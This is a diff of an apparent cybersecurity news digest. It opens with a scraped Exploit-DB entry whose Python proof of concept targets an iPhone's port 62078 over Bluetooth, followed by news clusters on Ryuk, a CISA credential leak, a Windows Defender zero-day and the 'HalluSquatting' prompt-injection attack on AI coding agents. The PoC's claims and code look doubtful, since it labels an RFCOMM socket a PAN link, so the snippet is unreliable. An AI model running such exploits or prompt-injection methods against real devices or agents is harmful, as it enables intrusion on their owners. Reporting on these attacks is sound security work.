+Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter EDB-ID: 52618 CVE: N/A EDB Verified: Author: Fares Dahoumane Type: remote Exploit: / Platform: iOS Date: 2026-07-07 Vulnerable App: # Exploit Title: iOS Bluetooth PAN - Zero-Cost Ethernet Gateway (USB Port 62078) # Date: 2026-06-23 # Exploit Author: Fares Dahoumane (Silent Killer) # Vendor Homepage: https://www.apple.com/ # Software Link: https://www.apple.com/ios/ # Version: iOS 17 and later # Tested on: iPhone 14 Pro (iOS 17.5.1), macOS Ventura 13.6 # CVE : N/A (Apple closed the case without assigning a CVE) # Reference: https://github.com/F4R3SX0/iOS-Bluetooth-Ethernet-Exploit # Description: # A logic flaw in Apple's iOS Bluetooth PAN stack allows an attacker to force an # iPhone to display a real "Ethernet" icon and open the core USB port (62078) # over Bluetooth without any cable or adapter. The attack costs €0 to execute, # while Apple sells the Satechi Multiport Pro V2 adapter for €89.95 to achieve # the same result. The connection persists after reboot and password changes. # Proof of Concept (Python): import bluetooth import socket import time # Replace with the victim's iPhone Bluetooth MAC address TARGET_MAC = "XX:XX:XX:XX:XX:XX" USB_PORT = 62078 def create_pan_connection(mac_address): """ Create a Bluetooth PAN connection to the target iPhone. This triggers the opening of USB port 62078 and displays the Ethernet icon. """ try: # Establish Bluetooth PAN connection sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM) sock.connect((mac_address, 1)) # PAN service print(f"[+] PAN connection established to {mac_address}") # Wait for the system to open the USB port time.sleep(2) # Attempt to connect to USB port (62078) over the PAN network usb_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) usb_sock.settimeout(5) # The iPhone's IP address on the PAN network is typically 172.20.10.x usb_sock.connect(("172.20.10.1", USB_PORT)) print(f"[+] USB port {USB_PORT} is now open and reachable!") print("[+] Ethernet icon should now be visible on the target iPhone.") usb_sock.close() sock.close() except Exception as e: print(f"[-] Error: {e}") if __name__ == "__main__": print("[*] iOS Bluetooth PAN Exploit - Zero-Cost Ethernet Gateway") print("[*] Target MAC: " + TARGET_MAC) create_pan_connection(TARGET_MAC) Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services
 ```
 
 #### Corroborating sources (1)
@@ -2191,6 +2208,92 @@ Back to Blog Security Operations A Day With Your Vector Command Red Team Pod Tre
   - Published: 2026-07-06T14:26:46+00:00
   - Link: https://www.rapid7.com/blog/post/so-ditl-day-with-your-vector-command-red-team-pod
   - Summary: Anyone trying to understand continuous red teaming usually gets the same high-level explanation: it is ongoing, attacker-informed, and designed to uncover risk between formal assessments. Useful as that description is, it still leaves most people with the same question, which is what the service actually looks like when a team is working against a real environment day after day. A Vector Command pod answers that question more clearly than a list of features ever could. Five dedicated operators work against a customer environment continuously, each bringing a different specialty, while the pod as a whole simulates the range, coordination, and persistence of a real adversary. Over time, that gives the customer far more than a periodic snapshot. It gives them a team that keeps learning the environment, keeps pressure on the attack surface, and keeps surfacing the kinds of changes that can turn into incidents if no one catches them quickly. Because the environment keeps changing, the value
+
+### Cluster eaade871e6 — score 10
+
+- Title: Armenian national pleads guilty to Ryuk ransomware attacks
+- Source: CyberScoop (cyber_news_breach_reporting)
+- Published: 2026-07-10T20:13:27+00:00
+- Link: https://cyberscoop.com/karen-vardanyan-armenian-ryuk-ransomware-guilty/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion
+- actor_attribution: Scattered Spider
+- affected_industries: critical_infrastructure, education, government, healthcare
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, phishing_social_eng, apt_espionage
+- actor_attribution: Scattered Spider
+- affected_industries: healthcare, government, critical_infrastructure, education
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Karen Vardanyan faces up to 15 years in federal prison and agreed to pay nearly $1.2 million in restitution. The post Armenian national pleads guilty to Ryuk ransomware attacks appeared first on CyberScoop .
+```
+
+#### Full body
+
+```
+Advertisement Subscribe to our daily newsletter. Subscribe Close An Armenian national who was extradited from Ukraine to the United States last year pleaded guilty to participating in a series of attacks in 2019 and 2020 involving Ryuk ransomware, the Justice Department said Thursday. Karen Serobovich Vardanyan pleaded guilty to computer fraud and conspiracy to commit fraud and extortion. He agreed to pay nearly $1.2 million million in restitution and faces up to 15 years in jail. The 34-year-old admitted to participating in cybercrime from November 2019 to April 2020 when he and his co-conspirators deployed Ryuk ransomware against three U.S.-based organizations while living in Ukraine and Russia. Vardanyan’s victims include a Michigan-based company that paid a ransom of nearly $1.2 million in January 2020, a Watsonville, Oregon-based technology company that was attacked in December 2019 and a Texas-based school breached in February 2020. Advertisement Prosecutors previously accused Vardanyan and his co-conspirators — Ukrainian nationals Oleg Nikolayevich Lyulyava and Andrii Leonydovich Prykhodchenko, and Armenian national Levon Georgiyovych Avetisyan — of illegally accessing computer networks to deploy Ryuk ransomware on hundreds of compromised servers and workstations between March 2019 and September 2020. Ryuk ransomware was prevalent in 2019 and 2020, infecting thousands of victims globally across the private sector, state and local municipalities, local school districts and critical infrastructure, including a wave of attacks on U.S. hospitals. Victims of Ryuk ransomware attacks include Hollywood Presbyterian Medical Center , Universal Health Services , Electronic Warfare Associates , a North Carolina water utility and multiple U.S. newspapers. Ryuk ransomware operators extorted victim companies by demanding ransom payments in Bitcoin in exchange for decryption keys. Justice Department officials said Vardanyan and his co-conspirators received about 1,160 bitcoins — valued at more than $15 million at the time — in ransom payments from victim companies. Vardanyan, as part of his guilty plea, also acknowledged that his conviction will have immigration consequences resulting in removal from the United States after serving his sentence. Advertisement The U.S. District Court for the District of Oregon has yet to schedule his sentencing. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops Gwengoat, iStock/Getty Images Plus (Getty Images) Latest Podcasts When iPhone exploits turn into commodities What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Inside Operation Disruption Week: Taking Down Southeast Asia’s Scam Machine Government French nonprofit starts global intelligence and research hub for AI cyber threats US Army websites defaced with pro-Kurdish sentiments, insults to Trump Someone infected a spyware probe overseer with spyware US lifting export control restrictions on Anthropic’s Mythos, Fable Technology Deepfake CSAM lawsuit against xAI, Grok expands Supreme Court delivers ‘major win’ for tech privacy in Chatrie ruling What the post-quantum executive order really demands of CISOs FCC passes new cybersecurity rules for emergency systems, undersea cables Threats Suspected Chinese espionage group used a Roundcube exploit chain to burrow into universities Alleged longstanding member of Scattered Spider extradited to US Researchers spot exploitation of another critical Oracle defect This phishing kit looks more like BEC-as-a-service Policy Trump budget boss Russell Vought open to re-staffing CISA DHS to unveil replacement council for critical infrastructure cybersecurity Warner bill would create federally vetted list for secure, trustworthy AI agents Supreme Court approves mail-in ballots that arrive after Election Day
+```
+
+#### Corroborating sources (1)
+
+- **CyberScoop** (cyber_news_breach_reporting)
+  - Title: Armenian national pleads guilty to Ryuk ransomware attacks
+  - Published: 2026-07-10T20:13:27+00:00
+  - Link: https://cyberscoop.com/karen-vardanyan-armenian-ryuk-ransomware-guilty/
+  - Summary: Karen Vardanyan faces up to 15 years in federal prison and agreed to pay nearly $1.2 million in restitution. The post Armenian national pleads guilty to Ryuk ransomware attacks appeared first on CyberScoop .
+
+### Cluster 6b9fe41d07 — score 10
+
+- Title: CISA looks to remedy ailments from big May credential leak
+- Source: CyberScoop (cyber_news_breach_reporting)
+- Published: 2026-07-10T18:54:28+00:00
+- Link: https://cyberscoop.com/cisa-credential-leak-forensic-report/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- affected_industries: critical_infrastructure, government
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- affected_industries: government, critical_infrastructure
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+A major credential leak spurred the Cybersecurity and Infrastructure Security Agency to strengthen protections for its sensitive materials, improve how researchers can report agency vulnerabilities and develop plans for similar incidents, the agency said in a forensic report released Thursday. The blog post outlines CISA’s response to the leak that the researcher who discovered it […] The post CISA looks to remedy ailments from big May credential leak appeared first on CyberScoop .
+```
+
+#### Full body
+
+```
+Advertisement Subscribe to our daily newsletter. Subscribe Close A major credential leak spurred the Cybersecurity and Infrastructure Security Agency to strengthen protections for its sensitive materials, improve how researchers can report agency vulnerabilities and develop plans for similar incidents, the agency said in a forensic report released Thursday. The blog post outlines CISA’s response to the leak that the researcher who discovered it in May called one of the worst he had ever seen, which also drew congressional scrutiny . “Sharing experiences from incident response activities help other organizations learn from such experiences and enables them to take necessary precautions to prevent similar incidents from happening in their environments,” wrote Preston Werntz, acting chief information officer and Brad Libbey, acting chief information security officer. “For years, CISA has said this type of information exchange is critical to identifying trends and contributing to broader national awareness. Now, it is our turn.” On May 15, after learning about a contractor’s leak of privileged Amazon AWS GovCloud Keys on a public GitHub repository, CISA said it took steps to halt further harm. That meant taking the repository and its developer environment offline, and revoking the access of the person responsible for the leak. Advertisement CISA then analyzed the repository to get a sense of the scope of the leak. It also analyzed log files to learn that none of the leaked credentials were used outside of CISA, and that no customer or mission data was exposed. The response benefited from taking the reported incident seriously, having good logging capabilities and using zero-trust principles, the blog post states. But it also showed some things that needed to be fixed. CISA resolved to use its endpoint detection and response capabilities to monitor and manage uploads to public repositories. It rotated all of its secrets after the incident, and came up with a plan to improve management of its secrets. It determined that it would make it easy to report vulnerabilities related to CISA itself. It’s better at receiving information about vulnerabilities that are less agency-specific, given its role as a hub of communication about cyber risks for the United States and world generally, the post noted. Advertisement CISA also said it had to build a playbook for GitHub-related incidents mid-incident, and recognized the need to build playbooks for all kinds of incidents in advance. The person who uncovered the leak, GitGuardian security researcher Guillaume Valadon, applauded CISA’s evaluation of the incident. “I think that it is really good. CISA managed to explain what happened, what worked well and what needs to be improved,” he told CyberScoop via email. “This last part is, to me, the first time that a national cybersecurity agency is advocating for secrets scanning, and simplifying relations with researchers.” That’s something Valadon and his team have talked about for a while, and he said he was “proud to read that it is recognized by CISA.” Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops Citrix rated the overall bulletin severity as high and assigned CVSS scores ranging from 6.9 to 8.8 across the six CVEs. (Photo by Justin Sullivan/Getty Images) Nadezhda Buravleva, iStock/Getty Images Plus (Getty Images) Latest Podcasts When iPhone exploits turn into commodities What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Inside Operation Disruption Week: Taking Down Southeast Asia’s Scam Machine Government Someone infected a spyware probe overseer with spyware US lifting export control restrictions on Anthropic’s Mythos, Fable Trump budget boss Russell Vought open to re-staffing CISA DHS to unveil replacement council for critical infrastructure cybersecurity Technology Deepfake CS
+```
+
+#### Corroborating sources (1)
+
+- **CyberScoop** (cyber_news_breach_reporting)
+  - Title: CISA looks to remedy ailments from big May credential leak
+  - Published: 2026-07-10T18:54:28+00:00
+  - Link: https://cyberscoop.com/cisa-credential-leak-forensic-report/
+  - Summary: A major credential leak spurred the Cybersecurity and Infrastructure Security Agency to strengthen protections for its sensitive materials, improve how researchers can report agency vulnerabilities and develop plans for similar incidents, the agency said in a forensic report released Thursday. The blog post outlines CISA’s response to the leak that the researcher who discovered it […] The post CISA looks to remedy ailments from big May credential leak appeared first on CyberScoop .
 
 ### Cluster ce7170bd38 — score 10
 
@@ -2434,147 +2537,6 @@ Table of contents Why Cloud Risk Looks Different in Fintech Misconfiguration Det
   - Published: 2026-07-10T12:50:00+00:00
   - Link: https://orca.security/resources/blog/cloud-risk-reduction-strategies-for-fintech/
   - Summary: Fintech security teams operate under compounding pressure. Sensitive financial data flows across multi-cloud environments, regulatory mandates like PCI-DSS and SOC 2 each require continuous attention, and cloud infrastructure scales faster than most security programs can keep up with. When a CSPM tool generates thousands of alerts 90 days before an audit with no clear picture […]
-
-### Cluster ec6ada1c31 — score 9
-
-- Title: Reduce Human Risk | Build a Strong Security Awareness Training Program | Huntress
-- Source: Huntress (detection_response_operations)
-- Published: 2026-07-09T20:00:00+00:00
-- Link: https://www.huntress.com/blog/what-is-a-security-awareness-training-program
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage, data_breach, phishing_social_eng, ransomware_extortion, web_shell_backdoor, zero_day
-- affected_industries: education
-- affected_products: Anthropic/Claude, OpenAI/ChatGPT
-- urgency_signals: zero_day
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, data_breach, apt_espionage, web_shell_backdoor
-- affected_industries: education
-- affected_products: Anthropic/Claude, OpenAI/ChatGPT
-- urgency_signals: zero_day
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-Build a security awareness training program that actually changes user behavior. Huntress Managed SAT delivers engaging content, phishing sims, and results.
-```
-
-#### Full body
-
-```
-Home Blog What Is a Security Awareness Training Program? Last Updated: July 9, 2026 What Is a Security Awareness Training Program? By: Lizzie Danielson James O’Leary Summarize with AI Summarize ChatGPT Claude Perplexity Google AI 68% of data breaches start with a person making a mistake. Not a sophisticated zero-day exploit. Not a nation-state backdoor. A person clicking the wrong link, reusing a password, or trusting an email that looked just real enough. One of the most effective ways to stop a cyberattack is to implement a security awareness training program. Every employee, from the C-suite to the interns, needs to know how to spot a suspicious email, where to report it, and why it’s so critical. The average cost of a data breach is now firmly in the multi-million-dollar range, about $4.44 million globally and $10.22 million in the U.S., according to IBM’s 2025 Cost of a Data Breach Report. Here's the uncomfortable truth: your people are the biggest risk to your organization’s security. But they're also your strongest defense; if you train them right. In this article, we’ll break down why security awareness training is an essential component for building a strong cybersecurity culture within your organization What is a security awareness training program? A security awareness training program teaches employees how to spot and respond to cybersecurity threats: phishing emails, weak passwords, social engineering, malware, ransomware — and gives them practical steps to avoid them. Think of it this way: without a formal program, you're just hoping employees know what to do. A comprehensive training program does more than just run phishing tests; it provides ongoing education and engaging content that builds a baseline of security knowledge across your organization. Your employees are the first line of defense. By fostering a culture of security through training, you empower them to protect the business. The value of security training is immense—organizations spend far more time, money, and resources cleaning up after a data breach than they do preventing one. 15 must-have components of an effective behavior security awareness training program Ready to build a program that actually works? Here are the 16 essential components every security awareness training program should include. 1. Engaging training content If you want employees to retain what they learn, the content has to be fun and relatable. Ditch the "death by PowerPoint" presentations. Your employees should walk away saying they actually enjoyed the training. Implementation guidance: Topics: Cover modern cyber threats like phishing, social engineering, ransomware, password security, and multi-factor authentication (MFA). Format: Use a mix of videos, interactive quizzes, realistic phishing simulatoins, and hands-on learning experiences. Message: Clearly explain why security awareness is so important for the organization and for them personally. 2. Realistic phishing simulator Phishing simulations are one of the most effective ways to assess the impact of your training. The 2025 Verizon Data Breach Investigations Report reveals that 60% of data breaches involve the human element, including phishing attacks, highlighting the critical need for continuous employee education. Implementation guidance: Frequency: Run phishing tests at least monthly. Relevance: Use templates that mimic real-world phishing scams and tradecraft. Goal: Train employees in a safe environment, allowing them to learn from their mistakes without real-world consequences. 3. A simple way to report phishing Employees need a one-click solution to report suspicious emails . Whether they're on a desktop or a mobile device, the process should be simple and consistent. This allows your IT security team to be notified immediately and respond to potential company-wide threats. 4. Learning Management System (LMS) You need a centralized system to record, track, and distribute training content to all employees, inc
-```
-
-#### Corroborating sources (1)
-
-- **Huntress** (detection_response_operations)
-  - Title: Reduce Human Risk | Build a Strong Security Awareness Training Program | Huntress
-  - Published: 2026-07-09T20:00:00+00:00
-  - Link: https://www.huntress.com/blog/what-is-a-security-awareness-training-program
-  - Summary: Build a security awareness training program that actually changes user behavior. Huntress Managed SAT delivers engaging content, phishing sims, and results.
-
-### Cluster d1756ef0c6 — score 9
-
-- Title: ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism
-- Source: SecurityWeek (cyber_news_breach_reporting)
-- Published: 2026-07-10T08:32:33+00:00
-- Link: https://www.securityweek.com/hallusquatting-turns-ai-hallucinations-into-botnet-delivery-mechanism/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: ai_security, phishing_social_eng, ransomware_extortion
-- affected_industries: education, manufacturing_industrial
-- affected_products: GitHub, Okta, Palo Alto Networks
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, phishing_social_eng, ai_security
-- affected_industries: manufacturing_industrial, education
-- affected_products: Okta, Palo Alto Networks, GitHub
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Researchers demonstrate adversarial hallucination squatting against popular AI assistants to achieve remote code execution. The post ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism appeared first on SecurityWeek .
-```
-
-#### Full body
-
-```
-Researchers from Tel Aviv University, Technion, and Intuit have detailed a new attack technique dubbed ‘HalluSquatting’ that turns AI assistants’ tendency to hallucinate into a scalable infection vector. The cybersecurity community has identified several ways to hack or hijack AI tools through prompt injection delivered via channels such as emails, logs, comments, and messaging notifications. These promptware attacks leverage the fact that the attacker has a direct channel to the targeted user’s LLM application. HalluSquatting, on the other hand, has been described as a form of untargeted promptware that relies on a technique named adversarial hallucination squatting, in which threat actors can exploit AI applications at scale without a direct channel. In a HalluSquatting attack, the attacker pre-registers the fake repository or package names that LLMs commonly invent when asked to fetch popular, trending resources. The research team says hallucination rates in their tests reached as high as 85% for repo-cloning prompts and 100% for skill installations, and that the same hallucinated names tend to recur across different foundation models, making the technique broadly transferable. Advertisement. Scroll to continue reading. Once the hallucinated repositories and packages are registered, the attacker can plant malicious instructions inside them. When an unsuspecting user asks an AI tool like Cursor, Windsurf, GitHub Copilot, Cline, Gemini CLI, or OpenClaw to clone a repository or install a skill, the assistant may hallucinate the squatted name, pull it down, and execute the attacker’s commands via its built-in terminal. Those commands can direct the AI to run additional tools or code, potentially deploying various types of malware or hacking tools. The HalluSquatting research has focused on using the technique to create agentic botnets whose size depends on how often AI tools hallucinate the attacker’s squatted resource. Traditional botnets rely on vulnerabilities, weak security practices, and lateral movement. In contrast, agentic botnets spread via prompt injections that bypass traditional firewalls and can take root on virtually any device, resulting in a far more heterogeneous population of compromised hosts than botnets such as Mirai . Affected vendors were notified before the publication of the HalluSquatting research , and the researchers withheld exploit details they believe could be directly reused by attackers. Related : AI Coding Tools Tricked Into Hacking Developer Machine via Decades-Old Technique Related : Google Dialogflow CX Bug Allowed Attackers to Hijack AI Conversations Related : Critical Vulnerability Exposes GitHub Agentic Workflows to Prompt Injection Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs Palo Alto Networks Patches 13 Vulnerabilities Microsoft Patches Defender ‘RoguePlanet’ Vulnerability AI Coding Tools Tricked Into Hacking Developer Machine via Decades-Old Technique Google Patches 382 Chrome Vulnerabilities BlueHammer Vulnerability Exploited in Ransomware Attacks Nissan Employee Data Breached in Oracle PeopleSoft Hack New Controller Flaws Expose Highway Signs and Billboards to Remote Hacking WhatsApp Rolling Out Username Feature to Bolster Phone Number Privacy Latest News In Other News: DHS Database Hacked, Adobe Boosts Patch Cadence, Canada Disrupts Ransomware Ops Third US Security Expert Sentenced to Prison for Helping Ransomware Gang China, India-Linked Hackers Both Targeted Same Pakistani Police Force Okta Warns of Vishing Attacks Targeting Microsoft 365 Customers
-```
-
-#### Corroborating sources (1)
-
-- **SecurityWeek** (cyber_news_breach_reporting)
-  - Title: ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism
-  - Published: 2026-07-10T08:32:33+00:00
-  - Link: https://www.securityweek.com/hallusquatting-turns-ai-hallucinations-into-botnet-delivery-mechanism/
-  - Summary: Researchers demonstrate adversarial hallucination squatting against popular AI assistants to achieve remote code execution. The post ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism appeared first on SecurityWeek .
-
-### Cluster 8fa37afed0 — score 9
-
-- Title: Microsoft Reins in RoguePlanet Zero-Day Threat
-- Source: Dark Reading (cyber_news_breach_reporting)
-- Published: 2026-07-09T20:21:19+00:00
-- Link: https://www.darkreading.com/vulnerabilities-threats/microsoft-rogueplanet-zero-day-threat
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: zero_day
-- affected_industries: financial_services, legal_professional
-- affected_products: Microsoft Defender
-- cve_ids: CVE-2026-33825, CVE-2026-50656
-- urgency_signals: emergency_patch, no_patch_yet, poc_available, zero_day
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: zero_day
-- affected_industries: financial_services, legal_professional
-- affected_products: Microsoft Defender
-- cve_ids: CVE-2026-50656, CVE-2026-33825
-- urgency_signals: zero_day, emergency_patch, no_patch_yet, poc_available
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-The researcher known as "Nightmare-Eclipse" published a proof-of-concept (PoC) exploit for the Windows Defender vulnerability in early June after dropping several other Microsoft zero-days.
-```
-
-#### Full body
-
-```
-Vulnerabilities & Threats Cyber Risk Application Security Cybersecurity Operations News Microsoft Reins in RoguePlanet Zero-Day Threat The researcher known as "Nightmare-Eclipse" published a proof-of-concept (PoC) exploit for the Windows Defender vulnerability in early June after dropping several other Microsoft zero-days. Rob Wright , Senior News Director , Dark Reading July 9, 2026 4 Min Read Source: Mark StevensonUIG via Getty Images Microsoft has tackled yet another zero-day vulnerability published by a disgruntled security researcher with a vendetta against the software giant. On Wednesday, Microsoft issued an out-of-band patch for RoguePlanet , an elevation-of-privilege vulnerability in Windows Defender, tracked as CVE-2026-50656. The high-severity flaw, which received a 7.8 CVSS score from Microsoft, could allow an attacker to escalate privileges on a Windows device from a basic user to the highest SYSTEM-level access, which would give them complete control over the device. RoguePlanet was initially published, along with a proof-of-concept (PoC) exploit, by an anonymous security researcher known as "Nightmare-Eclipse," who has been embroiled in a public feud with Microsoft for several months. The dispute began in April when the researcher published an exploit for another privilege-escalation flaw in Windows Defender, dubbed " BlueHammer " and tracked as CVE-2026-33825, out of frustration with Microsoft's Security Response Center (MSRC). Related: Fresh ATM Crypto Software Bugs: Jackpot or Bust? The feud escalated over several weeks, with Microsoft taking action and issuing legal threats, while Nightmare-Eclipse continued publishing additional zero-day exploits , several of which came under attack soon after. The research swore revenge against Microsoft for allegedly humiliating them, and threatened to "make sure your bones are shattered" on July 14, though Nightmare-Eclipse has since backed off that date. RoguePlanet's Enterprise Cyber-Risks The patch for RoguePlanet is included in the Microsoft Malware Protection Engine version 1.1.26060.3008. According to Microsoft's advisory for CVE-2026-50656, Windows systems that have disabled Microsoft Defender "are not in an exploitable state." However, Microsoft noted the attack complexity for the vulnerability is low, and that exploitation is "more likely." In a blog post on Thursday, SOCRadar noted that while RoguePlanet requires local access to a vulnerable device before exploitation and is best described a post-compromise privilege-escalation exploit, it's still dangerous. "RoguePlanet is not remotely exploitable by itself, but it can be highly valuable after an attacker gains local code execution as a standard user," the research team wrote in the blog post. As a second-stage tool, SOCRadar said RoguePlanet could give a threat actor the ability to tamper with security products and telemetry, dump credentials for lateral movement, and establish persistence through scheduled tasks and other techniques. Additionally, SOCRadar noted that Nightmare-Eclipse's ongoing feud with Microsoft has "driven multiple public exploit releases ahead of typical patch cycles, increasing risk for unpatched environments." SOCRadar chief information security officer (CISO) Ensar Seker tells Dark Reading that, while it's unusual for Microsoft to issue an emergency update shortly before a Patch Tuesday release (July's is on the 14th), it's likely due to increased urgency around a flaw. Related: CitrixBleed-ing Again? NetScaler Vulnerability Under Attack "Nightmare-Eclipse has repeatedly published detailed technical analyses and proof-of-concept exploits shortly after Patch Tuesday, reducing the amount of time defenders have before attackers can begin weaponizing the research," Seker says. "Even if Microsoft had already been preparing the fix, widespread public availability of exploit details likely accelerated its release." RoguePlanet's Uncertain Exploitation Status Despite a public exploit being av
-```
-
-#### Corroborating sources (1)
-
-- **Dark Reading** (cyber_news_breach_reporting)
-  - Title: Microsoft Reins in RoguePlanet Zero-Day Threat
-  - Published: 2026-07-09T20:21:19+00:00
-  - Link: https://www.darkreading.com/vulnerabilities-threats/microsoft-rogueplanet-zero-day-threat
-  - Summary: The researcher known as "Nightmare-Eclipse" published a proof-of-concept (PoC) exploit for the Windows Defender vulnerability in early June after dropping several other Microsoft zero-days.
 
 ### Cluster aad8380132 — score 9
 
@@ -2833,6 +2795,53 @@ When AI agents look like attackers: what behavioral telemetry tells us An X-Ops 
   - Link: https://www.sophos.com/en-us/blog/2607_agents_vs_telemetry
   - Summary: <p>An X-Ops analysis of how AI coding agents trigger endpoint detection rules designed for adversaries</p> Categories: Threat Research
 
+### Cluster ec6ada1c31 — score 8
+
+- Title: Reduce Human Risk | Build a Strong Security Awareness Training Program | Huntress
+- Source: Huntress (detection_response_operations)
+- Published: 2026-07-09T20:00:00+00:00
+- Link: https://www.huntress.com/blog/what-is-a-security-awareness-training-program
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage, data_breach, phishing_social_eng, ransomware_extortion, web_shell_backdoor, zero_day
+- affected_industries: education
+- affected_products: Anthropic/Claude, OpenAI/ChatGPT
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, data_breach, apt_espionage, web_shell_backdoor
+- affected_industries: education
+- affected_products: Anthropic/Claude, OpenAI/ChatGPT
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+Build a security awareness training program that actually changes user behavior. Huntress Managed SAT delivers engaging content, phishing sims, and results.
+```
+
+#### Full body
+
+```
+Home Blog What Is a Security Awareness Training Program? Last Updated: July 9, 2026 What Is a Security Awareness Training Program? By: Lizzie Danielson James O’Leary Summarize with AI Summarize ChatGPT Claude Perplexity Google AI 68% of data breaches start with a person making a mistake. Not a sophisticated zero-day exploit. Not a nation-state backdoor. A person clicking the wrong link, reusing a password, or trusting an email that looked just real enough. One of the most effective ways to stop a cyberattack is to implement a security awareness training program. Every employee, from the C-suite to the interns, needs to know how to spot a suspicious email, where to report it, and why it’s so critical. The average cost of a data breach is now firmly in the multi-million-dollar range, about $4.44 million globally and $10.22 million in the U.S., according to IBM’s 2025 Cost of a Data Breach Report. Here's the uncomfortable truth: your people are the biggest risk to your organization’s security. But they're also your strongest defense; if you train them right. In this article, we’ll break down why security awareness training is an essential component for building a strong cybersecurity culture within your organization What is a security awareness training program? A security awareness training program teaches employees how to spot and respond to cybersecurity threats: phishing emails, weak passwords, social engineering, malware, ransomware — and gives them practical steps to avoid them. Think of it this way: without a formal program, you're just hoping employees know what to do. A comprehensive training program does more than just run phishing tests; it provides ongoing education and engaging content that builds a baseline of security knowledge across your organization. Your employees are the first line of defense. By fostering a culture of security through training, you empower them to protect the business. The value of security training is immense—organizations spend far more time, money, and resources cleaning up after a data breach than they do preventing one. 15 must-have components of an effective behavior security awareness training program Ready to build a program that actually works? Here are the 16 essential components every security awareness training program should include. 1. Engaging training content If you want employees to retain what they learn, the content has to be fun and relatable. Ditch the "death by PowerPoint" presentations. Your employees should walk away saying they actually enjoyed the training. Implementation guidance: Topics: Cover modern cyber threats like phishing, social engineering, ransomware, password security, and multi-factor authentication (MFA). Format: Use a mix of videos, interactive quizzes, realistic phishing simulatoins, and hands-on learning experiences. Message: Clearly explain why security awareness is so important for the organization and for them personally. 2. Realistic phishing simulator Phishing simulations are one of the most effective ways to assess the impact of your training. The 2025 Verizon Data Breach Investigations Report reveals that 60% of data breaches involve the human element, including phishing attacks, highlighting the critical need for continuous employee education. Implementation guidance: Frequency: Run phishing tests at least monthly. Relevance: Use templates that mimic real-world phishing scams and tradecraft. Goal: Train employees in a safe environment, allowing them to learn from their mistakes without real-world consequences. 3. A simple way to report phishing Employees need a one-click solution to report suspicious emails . Whether they're on a desktop or a mobile device, the process should be simple and consistent. This allows your IT security team to be notified immediately and respond to potential company-wide threats. 4. Learning Management System (LMS) You need a centralized system to record, track, and distribute training content to all employees, inc
+```
+
+#### Corroborating sources (1)
+
+- **Huntress** (detection_response_operations)
+  - Title: Reduce Human Risk | Build a Strong Security Awareness Training Program | Huntress
+  - Published: 2026-07-09T20:00:00+00:00
+  - Link: https://www.huntress.com/blog/what-is-a-security-awareness-training-program
+  - Summary: Build a security awareness training program that actually changes user behavior. Huntress Managed SAT delivers engaging content, phishing sims, and results.
+
 ### Cluster 7a5a1701ad — score 8
 
 - Title: AI-Coded Malware | Analyzing Vibe-Coded AD Enumeration | Huntress
